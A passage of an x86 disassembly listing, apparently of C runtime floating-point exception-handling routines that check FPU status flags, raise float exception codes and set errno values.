  40a05c:	50                   	push   %eax
  40a05d:	8d 43 10             	lea    0x10(%ebx),%eax
  40a060:	50                   	push   %eax
  40a061:	ff 73 0c             	push   0xc(%ebx)
  40a064:	8d 43 20             	lea    0x20(%ebx),%eax
  40a067:	ff 73 08             	push   0x8(%ebx)
  40a06a:	50                   	push   %eax
  40a06b:	8d 45 80             	lea    -0x80(%ebp),%eax
  40a06e:	50                   	push   %eax
  40a06f:	e8 71 02 00 00       	call   0x40a2e5
  40a074:	8b 73 20             	mov    0x20(%ebx),%esi
  40a077:	83 c4 1c             	add    $0x1c,%esp
  40a07a:	ff 73 08             	push   0x8(%ebx)
  40a07d:	e8 5e ff ff ff       	call   0x409fe0
  40a082:	59                   	pop    %ecx
  40a083:	8b f8                	mov    %eax,%edi
  40a085:	e8 85 8d ff ff       	call   0x402e0f
  40a08a:	84 c0                	test   %al,%al
  40a08c:	74 29                	je     0x40a0b7
  40a08e:	85 ff                	test   %edi,%edi
  40a090:	74 25                	je     0x40a0b7
  40a092:	dd 43 18             	fldl   0x18(%ebx)
  40a095:	56                   	push   %esi
  40a096:	83 ec 18             	sub    $0x18,%esp
  40a099:	dd 5c 24 10          	fstpl  0x10(%esp)
  40a09d:	d9 ee                	fldz
  40a09f:	dd 5c 24 08          	fstpl  0x8(%esp)
  40a0a3:	dd 43 10             	fldl   0x10(%ebx)
  40a0a6:	dd 1c 24             	fstpl  (%esp)
  40a0a9:	ff 73 0c             	push   0xc(%ebx)
  40a0ac:	57                   	push   %edi
  40a0ad:	e8 53 05 00 00       	call   0x40a605
  40a0b2:	83 c4 24             	add    $0x24,%esp
  40a0b5:	eb 18                	jmp    0x40a0cf
  40a0b7:	57                   	push   %edi
  40a0b8:	e8 19 05 00 00       	call   0x40a5d6
  40a0bd:	c7 04 24 ff ff 00 00 	movl   $0xffff,(%esp)
  40a0c4:	56                   	push   %esi
  40a0c5:	e8 9e de ff ff       	call   0x407f68
  40a0ca:	dd 43 18             	fldl   0x18(%ebx)
  40a0cd:	59                   	pop    %ecx
  40a0ce:	59                   	pop    %ecx
  40a0cf:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40a0d2:	5f                   	pop    %edi
  40a0d3:	33 cd                	xor    %ebp,%ecx
  40a0d5:	5e                   	pop    %esi
  40a0d6:	e8 ed 76 ff ff       	call   0x4017c8
  40a0db:	8b e5                	mov    %ebp,%esp
  40a0dd:	5d                   	pop    %ebp
  40a0de:	8b e3                	mov    %ebx,%esp
  40a0e0:	5b                   	pop    %ebx
  40a0e1:	c3                   	ret
  40a0e2:	8b ff                	mov    %edi,%edi
  40a0e4:	55                   	push   %ebp
  40a0e5:	8b ec                	mov    %esp,%ebp
  40a0e7:	83 ec 10             	sub    $0x10,%esp
  40a0ea:	53                   	push   %ebx
  40a0eb:	8b 5d 08             	mov    0x8(%ebp),%ebx
  40a0ee:	56                   	push   %esi
  40a0ef:	8b f3                	mov    %ebx,%esi
  40a0f1:	83 e6 1f             	and    $0x1f,%esi
  40a0f4:	f6 c3 08             	test   $0x8,%bl
  40a0f7:	74 16                	je     0x40a10f
  40a0f9:	f6 45 10 01          	testb  $0x1,0x10(%ebp)
  40a0fd:	74 10                	je     0x40a10f
  40a0ff:	6a 01                	push   $0x1
  40a101:	e8 8e de ff ff       	call   0x407f94
  40a106:	59                   	pop    %ecx
  40a107:	83 e6 f7             	and    $0xfffffff7,%esi
  40a10a:	e9 90 01 00 00       	jmp    0x40a29f
  40a10f:	8b c3                	mov    %ebx,%eax
  40a111:	23 45 10             	and    0x10(%ebp),%eax
  40a114:	a8 04                	test   $0x4,%al
  40a116:	74 10                	je     0x40a128
  40a118:	6a 04                	push   $0x4
  40a11a:	e8 75 de ff ff       	call   0x407f94
  40a11f:	59                   	pop    %ecx
  40a120:	83 e6 fb             	and    $0xfffffffb,%esi
  40a123:	e9 77 01 00 00       	jmp    0x40a29f
  40a128:	f6 c3 01             	test   $0x1,%bl
  40a12b:	0f 84 9a 00 00 00    	je     0x40a1cb
  40a131:	f6 45 10 08          	testb  $0x8,0x10(%ebp)
  40a135:	0f 84 90 00 00 00    	je     0x40a1cb
  40a13b:	6a 08                	push   $0x8
  40a13d:	e8 52 de ff ff       	call   0x407f94
  40a142:	8b 45 10             	mov    0x10(%ebp),%eax
  40a145:	59                   	pop    %ecx
  40a146:	b9 00 0c 00 00       	mov    $0xc00,%ecx
  40a14b:	23 c1                	and    %ecx,%eax
  40a14d:	74 54                	je     0x40a1a3
  40a14f:	3d 00 04 00 00       	cmp    $0x400,%eax
  40a154:	74 37                	je     0x40a18d
  40a156:	3d 00 08 00 00       	cmp    $0x800,%eax
  40a15b:	74 1a                	je     0x40a177
  40a15d:	3b c1                	cmp    %ecx,%eax
  40a15f:	75 62                	jne    0x40a1c3
  40a161:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40a164:	d9 ee                	fldz
  40a166:	dc 19                	fcompl (%ecx)
  40a168:	df e0                	fnstsw %ax
  40a16a:	dd 05 d8 09 41 00    	fldl   0x4109d8
  40a170:	f6 c4 05             	test   $0x5,%ah
  40a173:	7b 4c                	jnp    0x40a1c1
  40a175:	eb 48                	jmp    0x40a1bf
  40a177:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40a17a:	d9 ee                	fldz
  40a17c:	dc 19                	fcompl (%ecx)
  40a17e:	df e0                	fnstsw %ax
  40a180:	f6 c4 05             	test   $0x5,%ah
  40a183:	7b 2c                	jnp    0x40a1b1
  40a185:	dd 05 d8 09 41 00    	fldl   0x4109d8
  40a18b:	eb 32                	jmp    0x40a1bf
  40a18d:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40a190:	d9 ee                	fldz
  40a192:	dc 19                	fcompl (%ecx)
  40a194:	df e0                	fnstsw %ax
  40a196:	f6 c4 05             	test   $0x5,%ah
  40a199:	7a 1e                	jp     0x40a1b9
  40a19b:	dd 05 d8 09 41 00    	fldl   0x4109d8
  40a1a1:	eb 1e                	jmp    0x40a1c1
  40a1a3:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40a1a6:	d9 ee                	fldz
  40a1a8:	dc 19                	fcompl (%ecx)
  40a1aa:	df e0                	fnstsw %ax
  40a1ac:	f6 c4 05             	test   $0x5,%ah
  40a1af:	7a 08                	jp     0x40a1b9
  40a1b1:	dd 05 d0 09 41 00    	fldl   0x4109d0
  40a1b7:	eb 08                	jmp    0x40a1c1
  40a1b9:	dd 05 d0 09 41 00    	fldl   0x4109d0
  40a1bf:	d9 e0                	fchs
  40a1c1:	dd 19                	fstpl  (%ecx)
  40a1c3:	83 e6 fe             	and    $0xfffffffe,%esi
  40a1c6:	e9 d4 00 00 00       	jmp    0x40a29f
  40a1cb:	f6 c3 02             	test   $0x2,%bl
  40a1ce:	0f 84 cb 00 00 00    	je     0x40a29f
  40a1d4:	f6 45 10 10          	testb  $0x10,0x10(%ebp)
  40a1d8:	0f 84 c1 00 00 00    	je     0x40a29f
  40a1de:	57                   	push   %edi
  40a1df:	33 ff                	xor    %edi,%edi
  40a1e1:	f6 c3 10             	test   $0x10,%bl
  40a1e4:	74 01                	je     0x40a1e7
  40a1e6:	47                   	inc    %edi
  40a1e7:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40a1ea:	dd 01                	fldl   (%ecx)
  40a1ec:	d9 ee                	fldz
  40a1ee:	da e9                	fucompp
  40a1f0:	df e0                	fnstsw %ax
  40a1f2:	f6 c4 44             	test   $0x44,%ah
  40a1f5:	0f 8b 91 00 00 00    	jnp    0x40a28c
  40a1fb:	dd 01                	fldl   (%ecx)
  40a1fd:	8d 45 fc             	lea    -0x4(%ebp),%eax
  40a200:	50                   	push   %eax
  40a201:	51                   	push   %ecx
  40a202:	51                   	push   %ecx
  40a203:	dd 1c 24             	fstpl  (%esp)
  40a206:	e8 9c 04 00 00       	call   0x40a6a7
  40a20b:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40a20e:	83 c4 0c             	add    $0xc,%esp
  40a211:	05 00 fa ff ff       	add    $0xfffffa00,%eax
  40a216:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40a219:	dd 55 f0             	fstl   -0x10(%ebp)
  40a21c:	d9 ee                	fldz
  40a21e:	3d ce fb ff ff       	cmp    $0xfffffbce,%eax
  40a223:	7d 07                	jge    0x40a22c
  40a225:	33 ff                	xor    %edi,%edi
  40a227:	de c9                	fmulp  %st,%st(1)
  40a229:	47                   	inc    %edi
  40a22a:	eb 59                	jmp    0x40a285
  40a22c:	de d9                	fcompp
  40a22e:	33 d2                	xor    %edx,%edx
  40a230:	df e0                	fnstsw %ax
  40a232:	f6 c4 41             	test   $0x41,%ah
  40a235:	75 01                	jne    0x40a238
  40a237:	42                   	inc    %edx
  40a238:	8b 45 f6             	mov    -0xa(%ebp),%eax
  40a23b:	b9 03 fc ff ff       	mov    $0xfffffc03,%ecx
  40a240:	83 e0 0f             	and    $0xf,%eax
  40a243:	83 c8 10             	or     $0x10,%eax
  40a246:	66 89 45 f6          	mov    %ax,-0xa(%ebp)
  40a24a:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40a24d:	3b c1                	cmp    %ecx,%eax
  40a24f:	7d 2b                	jge    0x40a27c
  40a251:	2b c8                	sub    %eax,%ecx
  40a253:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40a256:	f6 45 f0 01          	testb  $0x1,-0x10(%ebp)
  40a25a:	74 05                	je     0x40a261
  40a25c:	85 ff                	test   %edi,%edi
  40a25e:	75 01                	jne    0x40a261
  40a260:	47                   	inc    %edi
  40a261:	d1 e8                	shr    $1,%eax
  40a263:	f6 45 f4 01          	testb  $0x1,-0xc(%ebp)
  40a267:	89 45 f0             	mov    %eax,-0x10(%ebp)
  40a26a:	74 08                	je     0x40a274
  40a26c:	0d 00 00 00 80       	or     $0x80000000,%eax
  40a271:	89 45 f0             	mov    %eax,-0x10(%ebp)
  40a274:	d1 6d f4             	shrl   $1,-0xc(%ebp)
  40a277:	83 e9 01             	sub    $0x1,%ecx
  40a27a:	75 da                	jne    0x40a256
  40a27c:	dd 45 f0             	fldl   -0x10(%ebp)
  40a27f:	85 d2                	test   %edx,%edx
  40a281:	74 02                	je     0x40a285
  40a283:	d9 e0                	fchs
  40a285:	8b 45 0c             	mov    0xc(%ebp),%eax
  40a288:	dd 18                	fstpl  (%eax)
  40a28a:	eb 03                	jmp    0x40a28f
  40a28c:	33 ff                	xor    %edi,%edi
  40a28e:	47                   	inc    %edi
  40a28f:	85 ff                	test   %edi,%edi
  40a291:	5f                   	pop    %edi
  40a292:	74 08                	je     0x40a29c
  40a294:	6a 10                	push   $0x10
  40a296:	e8 f9 dc ff ff       	call   0x407f94
  40a29b:	59                   	pop    %ecx
  40a29c:	83 e6 fd             	and    $0xfffffffd,%esi
  40a29f:	f6 c3 10             	test   $0x10,%bl
  40a2a2:	74 11                	je     0x40a2b5
  40a2a4:	f6 45 10 20          	testb  $0x20,0x10(%ebp)
  40a2a8:	74 0b                	je     0x40a2b5
  40a2aa:	6a 20                	push   $0x20
  40a2ac:	e8 e3 dc ff ff       	call   0x407f94
  40a2b1:	59                   	pop    %ecx
  40a2b2:	83 e6 ef             	and    $0xffffffef,%esi
  40a2b5:	33 c0                	xor    %eax,%eax
  40a2b7:	85 f6                	test   %esi,%esi
  40a2b9:	5e                   	pop    %esi
  40a2ba:	0f 94 c0             	sete   %al
  40a2bd:	5b                   	pop    %ebx
  40a2be:	8b e5                	mov    %ebp,%esp
  40a2c0:	5d                   	pop    %ebp
  40a2c1:	c3                   	ret
  40a2c2:	8b ff                	mov    %edi,%edi
  40a2c4:	55                   	push   %ebp
  40a2c5:	8b ec                	mov    %esp,%ebp
  40a2c7:	6a 00                	push   $0x0
  40a2c9:	ff 75 1c             	push   0x1c(%ebp)
  40a2cc:	ff 75 18             	push   0x18(%ebp)
  40a2cf:	ff 75 14             	push   0x14(%ebp)
  40a2d2:	ff 75 10             	push   0x10(%ebp)
  40a2d5:	ff 75 0c             	push   0xc(%ebp)
  40a2d8:	ff 75 08             	push   0x8(%ebp)
  40a2db:	e8 05 00 00 00       	call   0x40a2e5
  40a2e0:	83 c4 1c             	add    $0x1c,%esp
  40a2e3:	5d                   	pop    %ebp
  40a2e4:	c3                   	ret
  40a2e5:	8b ff                	mov    %edi,%edi
  40a2e7:	55                   	push   %ebp
  40a2e8:	8b ec                	mov    %esp,%ebp
  40a2ea:	8b 45 08             	mov    0x8(%ebp),%eax
  40a2ed:	33 c9                	xor    %ecx,%ecx
  40a2ef:	53                   	push   %ebx
  40a2f0:	33 db                	xor    %ebx,%ebx
  40a2f2:	43                   	inc    %ebx
  40a2f3:	89 48 04             	mov    %ecx,0x4(%eax)
  40a2f6:	8b 45 08             	mov    0x8(%ebp),%eax
  40a2f9:	57                   	push   %edi
  40a2fa:	bf 0d 00 00 c0       	mov    $0xc000000d,%edi
  40a2ff:	89 48 08             	mov    %ecx,0x8(%eax)
  40a302:	8b 45 08             	mov    0x8(%ebp),%eax
  40a305:	89 48 0c             	mov    %ecx,0xc(%eax)
  40a308:	8b 4d 10             	mov    0x10(%ebp),%ecx
  40a30b:	f6 c1 10             	test   $0x10,%cl
  40a30e:	74 0b                	je     0x40a31b
  40a310:	8b 45 08             	mov    0x8(%ebp),%eax
  40a313:	bf 8f 00 00 c0       	mov    $0xc000008f,%edi
  40a318:	09 58 04             	or     %ebx,0x4(%eax)
  40a31b:	f6 c1 02             	test   $0x2,%cl
  40a31e:	74 0c                	je     0x40a32c
  40a320:	8b 45 08             	mov    0x8(%ebp),%eax
  40a323:	bf 93 00 00 c0       	mov    $0xc0000093,%edi
  40a328:	83 48 04 02          	orl    $0x2,0x4(%eax)
  40a32c:	f6 c1 01             	test   $0x1,%cl
  40a32f:	74 0c                	je     0x40a33d
  40a331:	8b 45 08             	mov    0x8(%ebp),%eax
  40a334:	bf 91 00 00 c0       	mov    $0xc0000091,%edi
  40a339:	83 48 04 04          	orl    $0x4,0x4(%eax)
  40a33d:	f6 c1 04             	test   $0x4,%cl
  40a340:	74 0c                	je     0x40a34e
  40a342:	8b 45 08             	mov    0x8(%ebp),%eax
  40a345:	bf 8e 00 00 c0       	mov    $0xc000008e,%edi
  40a34a:	83 48 04 08          	orl    $0x8,0x4(%eax)
  40a34e:	f6 c1 08             	test   $0x8,%cl
  40a351:	74 0c                	je     0x40a35f
  40a353:	8b 45 08             	mov    0x8(%ebp),%eax
  40a356:	bf 90 00 00 c0       	mov    $0xc0000090,%edi
  40a35b:	83 48 04 10          	orl    $0x10,0x4(%eax)
  40a35f:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40a362:	56                   	push   %esi
  40a363:	8b 75 0c             	mov    0xc(%ebp),%esi
  40a366:	8b 06                	mov    (%esi),%eax
  40a368:	c1 e0 04             	shl    $0x4,%eax
  40a36b:	f7 d0                	not    %eax
  40a36d:	33 41 08             	xor    0x8(%ecx),%eax
  40a370:	83 e0 10             	and    $0x10,%eax
  40a373:	31 41 08             	xor    %eax,0x8(%ecx)
  40a376:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40a379:	8b 06                	mov    (%esi),%eax
  40a37b:	03 c0                	add    %eax,%eax
  40a37d:	f7 d0                	not    %eax
  40a37f:	33 41 08             	xor    0x8(%ecx),%eax
  40a382:	83 e0 08             	and    $0x8,%eax
  40a385:	31 41 08             	xor    %eax,0x8(%ecx)
  40a388:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40a38b:	8b 06                	mov    (%esi),%eax
  40a38d:	d1 e8                	shr    $1,%eax
  40a38f:	f7 d0                	not    %eax
  40a391:	33 41 08             	xor    0x8(%ecx),%eax
  40a394:	83 e0 04             	and    $0x4,%eax
  40a397:	31 41 08             	xor    %eax,0x8(%ecx)
  40a39a:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40a39d:	8b 06                	mov    (%esi),%eax
  40a39f:	c1 e8 03             	shr    $0x3,%eax
  40a3a2:	f7 d0                	not    %eax
  40a3a4:	33 41 08             	xor    0x8(%ecx),%eax
  40a3a7:	83 e0 02             	and    $0x2,%eax
  40a3aa:	31 41 08             	xor    %eax,0x8(%ecx)
  40a3ad:	8b 06                	mov    (%esi),%eax
  40a3af:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40a3b2:	c1 e8 05             	shr    $0x5,%eax
  40a3b5:	f7 d0                	not    %eax
  40a3b7:	33 41 08             	xor    0x8(%ecx),%eax
  40a3ba:	23 c3                	and    %ebx,%eax
  40a3bc:	31 41 08             	xor    %eax,0x8(%ecx)
  40a3bf:	e8 2b dc ff ff       	call   0x407fef
  40a3c4:	8b d0                	mov    %eax,%edx
  40a3c6:	f6 c2 01             	test   $0x1,%dl
  40a3c9:	74 07                	je     0x40a3d2
  40a3cb:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40a3ce:	83 49 0c 10          	orl    $0x10,0xc(%ecx)
  40a3d2:	f6 c2 04             	test   $0x4,%dl
  40a3d5:	74 07                	je     0x40a3de
  40a3d7:	8b 45 08             	mov    0x8(%ebp),%eax
  40a3da:	83 48 0c 08          	orl    $0x8,0xc(%eax)
  40a3de:	f6 c2 08             	test   $0x8,%dl
  40a3e1:	74 07                	je     0x40a3ea
  40a3e3:	8b 45 08             	mov    0x8(%ebp),%eax
  40a3e6:	83 48 0c 04          	orl    $0x4,0xc(%eax)
  40a3ea:	f6 c2 10             	test   $0x10,%dl
  40a3ed:	74 07                	je     0x40a3f6
  40a3ef:	8b 45 08             	mov    0x8(%ebp),%eax
  40a3f2:	83 48 0c 02          	orl    $0x2,0xc(%eax)
  40a3f6:	f6 c2 20             	test   $0x20,%dl
  40a3f9:	74 06                	je     0x40a401
  40a3fb:	8b 45 08             	mov    0x8(%ebp),%eax
  40a3fe:	09 58 0c             	or     %ebx,0xc(%eax)
  40a401:	8b 06                	mov    (%esi),%eax
  40a403:	b9 00 0c 00 00       	mov    $0xc00,%ecx
  40a408:	23 c1                	and    %ecx,%eax
  40a40a:	74 35                	je     0x40a441
  40a40c:	3d 00 04 00 00       	cmp    $0x400,%eax
  40a411:	74 22                	je     0x40a435
  40a413:	3d 00 08 00 00       	cmp    $0x800,%eax
  40a418:	74 0c                	je     0x40a426
  40a41a:	3b c1                	cmp    %ecx,%eax
  40a41c:	75 29                	jne    0x40a447
  40a41e:	8b 45 08             	mov    0x8(%ebp),%eax
  40a421:	83 08 03             	orl    $0x3,(%eax)
  40a424:	eb 21                	jmp    0x40a447
  40a426:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40a429:	8b 01                	mov    (%ecx),%eax
  40a42b:	83 e0 fe             	and    $0xfffffffe,%eax
  40a42e:	83 c8 02             	or     $0x2,%eax
  40a431:	89 01                	mov    %eax,(%ecx)
  40a433:	eb 12                	jmp    0x40a447
  40a435:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40a438:	8b 01                	mov    (%ecx),%eax
  40a43a:	83 e0 fd             	and    $0xfffffffd,%eax
  40a43d:	0b c3                	or     %ebx,%eax
  40a43f:	eb f0                	jmp    0x40a431
  40a441:	8b 45 08             	mov    0x8(%ebp),%eax
  40a444:	83 20 fc             	andl   $0xfffffffc,(%eax)
  40a447:	8b 06                	mov    (%esi),%eax
  40a449:	b9 00 03 00 00       	mov    $0x300,%ecx
  40a44e:	23 c1                	and    %ecx,%eax
  40a450:	74 20                	je     0x40a472
  40a452:	3d 00 02 00 00       	cmp    $0x200,%eax
  40a457:	74 0c                	je     0x40a465
  40a459:	3b c1                	cmp    %ecx,%eax
  40a45b:	75 22                	jne    0x40a47f
  40a45d:	8b 45 08             	mov    0x8(%ebp),%eax
  40a460:	83 20 e3             	andl   $0xffffffe3,(%eax)
  40a463:	eb 1a                	jmp    0x40a47f
  40a465:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40a468:	8b 01                	mov    (%ecx),%eax
  40a46a:	83 e0 e7             	and    $0xffffffe7,%eax
  40a46d:	83 c8 04             	or     $0x4,%eax
  40a470:	eb 0b                	jmp    0x40a47d
  40a472:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40a475:	8b 01                	mov    (%ecx),%eax
  40a477:	83 e0 eb             	and    $0xffffffeb,%eax
  40a47a:	83 c8 08             	or     $0x8,%eax
  40a47d:	89 01                	mov    %eax,(%ecx)
  40a47f:	8b 45 08             	mov    0x8(%ebp),%eax
  40a482:	8b 4d 14             	mov    0x14(%ebp),%ecx
  40a485:	c1 e1 05             	shl    $0x5,%ecx
  40a488:	33 08                	xor    (%eax),%ecx
  40a48a:	81 e1 e0 ff 01 00    	and    $0x1ffe0,%ecx
  40a490:	31 08                	xor    %ecx,(%eax)
  40a492:	8b 45 08             	mov    0x8(%ebp),%eax
  40a495:	09 58 20             	or     %ebx,0x20(%eax)
  40a498:	83 7d 20 00          	cmpl   $0x0,0x20(%ebp)
  40a49c:	74 2c                	je     0x40a4ca
  40a49e:	8b 45 08             	mov    0x8(%ebp),%eax
  40a4a1:	83 60 20 e1          	andl   $0xffffffe1,0x20(%eax)
  40a4a5:	8b 45 18             	mov    0x18(%ebp),%eax
  40a4a8:	d9 00                	flds   (%eax)
  40a4aa:	8b 45 08             	mov    0x8(%ebp),%eax
  40a4ad:	d9 58 10             	fstps  0x10(%eax)
  40a4b0:	8b 45 08             	mov    0x8(%ebp),%eax
  40a4b3:	09 58 60             	or     %ebx,0x60(%eax)
  40a4b6:	8b 45 08             	mov    0x8(%ebp),%eax
  40a4b9:	8b 5d 1c             	mov    0x1c(%ebp),%ebx
  40a4bc:	83 60 60 e1          	andl   $0xffffffe1,0x60(%eax)
  40a4c0:	8b 45 08             	mov    0x8(%ebp),%eax
  40a4c3:	d9 03                	flds   (%ebx)
  40a4c5:	d9 58 50             	fstps  0x50(%eax)
  40a4c8:	eb 3a                	jmp    0x40a504
  40a4ca:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40a4cd:	8b 41 20             	mov    0x20(%ecx),%eax
  40a4d0:	83 e0 e3             	and    $0xffffffe3,%eax
  40a4d3:	83 c8 02             	or     $0x2,%eax
  40a4d6:	89 41 20             	mov    %eax,0x20(%ecx)
  40a4d9:	8b 45 18             	mov    0x18(%ebp),%eax
  40a4dc:	dd 00                	fldl   (%eax)
  40a4de:	8b 45 08             	mov    0x8(%ebp),%eax
  40a4e1:	dd 58 10             	fstpl  0x10(%eax)
  40a4e4:	8b 45 08             	mov    0x8(%ebp),%eax
  40a4e7:	09 58 60             	or     %ebx,0x60(%eax)
  40a4ea:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40a4ed:	8b 5d 1c             	mov    0x1c(%ebp),%ebx
  40a4f0:	8b 41 60             	mov    0x60(%ecx),%eax
  40a4f3:	83 e0 e3             	and    $0xffffffe3,%eax
  40a4f6:	83 c8 02             	or     $0x2,%eax
  40a4f9:	89 41 60             	mov    %eax,0x60(%ecx)
  40a4fc:	8b 45 08             	mov    0x8(%ebp),%eax
  40a4ff:	dd 03                	fldl   (%ebx)
  40a501:	dd 58 50             	fstpl  0x50(%eax)
  40a504:	e8 4c da ff ff       	call   0x407f55
  40a509:	8d 45 08             	lea    0x8(%ebp),%eax
  40a50c:	50                   	push   %eax
  40a50d:	6a 01                	push   $0x1
  40a50f:	6a 00                	push   $0x0
  40a511:	57                   	push   %edi
  40a512:	ff 15 48 c1 40 00    	call   *0x40c148
  40a518:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40a51b:	f6 41 08 10          	testb  $0x10,0x8(%ecx)
  40a51f:	74 03                	je     0x40a524
  40a521:	83 26 fe             	andl   $0xfffffffe,(%esi)
  40a524:	f6 41 08 08          	testb  $0x8,0x8(%ecx)
  40a528:	74 03                	je     0x40a52d
  40a52a:	83 26 fb             	andl   $0xfffffffb,(%esi)
  40a52d:	f6 41 08 04          	testb  $0x4,0x8(%ecx)
  40a531:	74 03                	je     0x40a536
  40a533:	83 26 f7             	andl   $0xfffffff7,(%esi)
  40a536:	f6 41 08 02          	testb  $0x2,0x8(%ecx)
  40a53a:	74 03                	je     0x40a53f
  40a53c:	83 26 ef             	andl   $0xffffffef,(%esi)
  40a53f:	f6 41 08 01          	testb  $0x1,0x8(%ecx)
  40a543:	74 03                	je     0x40a548
  40a545:	83 26 df             	andl   $0xffffffdf,(%esi)
  40a548:	8b 01                	mov    (%ecx),%eax
  40a54a:	ba ff f3 ff ff       	mov    $0xfffff3ff,%edx
  40a54f:	83 e0 03             	and    $0x3,%eax
  40a552:	83 e8 00             	sub    $0x0,%eax
  40a555:	74 35                	je     0x40a58c
  40a557:	83 e8 01             	sub    $0x1,%eax
  40a55a:	74 22                	je     0x40a57e
  40a55c:	83 e8 01             	sub    $0x1,%eax
  40a55f:	74 0d                	je     0x40a56e
  40a561:	83 e8 01             	sub    $0x1,%eax
  40a564:	75 28                	jne    0x40a58e
  40a566:	81 0e 00 0c 00 00    	orl    $0xc00,(%esi)
  40a56c:	eb 20                	jmp    0x40a58e
  40a56e:	8b 06                	mov    (%esi),%eax
  40a570:	25 ff fb ff ff       	and    $0xfffffbff,%eax
  40a575:	0d 00 08 00 00       	or     $0x800,%eax
  40a57a:	89 06                	mov    %eax,(%esi)
  40a57c:	eb 10                	jmp    0x40a58e
  40a57e:	8b 06                	mov    (%esi),%eax
  40a580:	25 ff f7 ff ff       	and    $0xfffff7ff,%eax
  40a585:	0d 00 04 00 00       	or     $0x400,%eax
  40a58a:	eb ee                	jmp    0x40a57a
  40a58c:	21 16                	and    %edx,(%esi)
  40a58e:	8b 01                	mov    (%ecx),%eax
  40a590:	c1 e8 02             	shr    $0x2,%eax
  40a593:	83 e0 07             	and    $0x7,%eax
  40a596:	83 e8 00             	sub    $0x0,%eax
  40a599:	74 19                	je     0x40a5b4
  40a59b:	83 e8 01             	sub    $0x1,%eax
  40a59e:	74 09                	je     0x40a5a9
  40a5a0:	83 e8 01             	sub    $0x1,%eax
  40a5a3:	75 1a                	jne    0x40a5bf
  40a5a5:	21 16                	and    %edx,(%esi)
  40a5a7:	eb 16                	jmp    0x40a5bf
  40a5a9:	8b 06                	mov    (%esi),%eax
  40a5ab:	23 c2                	and    %edx,%eax
  40a5ad:	0d 00 02 00 00       	or     $0x200,%eax
  40a5b2:	eb 09                	jmp    0x40a5bd
  40a5b4:	8b 06                	mov    (%esi),%eax
  40a5b6:	23 c2                	and    %edx,%eax
  40a5b8:	0d 00 03 00 00       	or     $0x300,%eax
  40a5bd:	89 06                	mov    %eax,(%esi)
  40a5bf:	83 7d 20 00          	cmpl   $0x0,0x20(%ebp)
  40a5c3:	5e                   	pop    %esi
  40a5c4:	74 07                	je     0x40a5cd
  40a5c6:	d9 41 50             	flds   0x50(%ecx)
  40a5c9:	d9 1b                	fstps  (%ebx)
  40a5cb:	eb 05                	jmp    0x40a5d2
  40a5cd:	dd 41 50             	fldl   0x50(%ecx)
  40a5d0:	dd 1b                	fstpl  (%ebx)
  40a5d2:	5f                   	pop    %edi
  40a5d3:	5b                   	pop    %ebx
  40a5d4:	5d                   	pop    %ebp
  40a5d5:	c3                   	ret
  40a5d6:	8b ff                	mov    %edi,%edi
  40a5d8:	55                   	push   %ebp
  40a5d9:	8b ec                	mov    %esp,%ebp
  40a5db:	8b 45 08             	mov    0x8(%ebp),%eax
  40a5de:	83 f8 01             	cmp    $0x1,%eax
  40a5e1:	74 15                	je     0x40a5f8
  40a5e3:	83 c0 fe             	add    $0xfffffffe,%eax
  40a5e6:	83 f8 01             	cmp    $0x1,%eax
  40a5e9:	77 18                	ja     0x40a603
  40a5eb:	e8 4b a2 ff ff       	call   0x40483b
  40a5f0:	c7 00 22 00 00 00    	movl   $0x22,(%eax)
  40a5f6:	5d                   	pop    %ebp
  40a5f7:	c3                   	ret
  40a5f8:	e8 3e a2 ff ff       	call   0x40483b
  40a5fd:	c7 00 21 00 00 00    	movl   $0x21,(%eax)
  40a603:	5d                   	pop    %ebp
  40a604:	c3                   	ret
  40a605:	8b ff                	mov    %edi,%edi
  40a607:	55                   	push   %ebp
  40a608:	8b ec                	mov    %esp,%ebp
  40a60a:	8b 55 0c             	mov    0xc(%ebp),%edx
  40a60d:	83 ec 20             	sub    $0x20,%esp
  40a610:	33 c9                	xor    %ecx,%ecx
  40a612:	8b c1                	mov    %ecx,%eax
  40a614:	39 14 c5 d8 08 41 00 	cmp    %edx,0x4108d8(,%eax,8)
  40a61b:	74 08                	je     0x40a625
  40a61d:	40                   	inc    %eax
  40a61e:	83 f8 1d             	cmp    $0x1d,%eax
  40a621:	7c f1                	jl     0x40a614
  40a623:	eb 07                	jmp    0x40a62c
  40a625:	8b 0c c5 dc 08 41 00 	mov    0x4108dc(,%eax,8),%ecx
  40a62c:	89 4d e4             	mov    %ecx,-0x1c(%ebp)
  40a62f:	85 c9                	test   %ecx,%ecx
  40a631:	74 55                	je     0x40a688
  40a633:	8b 45 10             	mov    0x10(%ebp),%eax
  40a636:	89 45 e8             	mov    %eax,-0x18(%ebp)
  40a639:	8b 45 14             	mov    0x14(%ebp),%eax
  40a63c:	89 45 ec             	mov    %eax,-0x14(%ebp)
  40a63f:	8b 45 18             	mov    0x18(%ebp),%eax
  40a642:	89 45 f0             	mov    %eax,-0x10(%ebp)
  40a645:	8b 45 1c             	mov    0x1c(%ebp),%eax
  40a648:	56                   	push   %esi
  40a649:	8b 75 08             	mov    0x8(%ebp),%esi
  40a64c:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40a64f:	8b 45 20             	mov    0x20(%ebp),%eax
  40a652:	68 ff ff 00 00       	push   $0xffff
  40a657:	ff 75 28             	push   0x28(%ebp)
  40a65a:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40a65d:	8b 45 24             	mov    0x24(%ebp),%eax
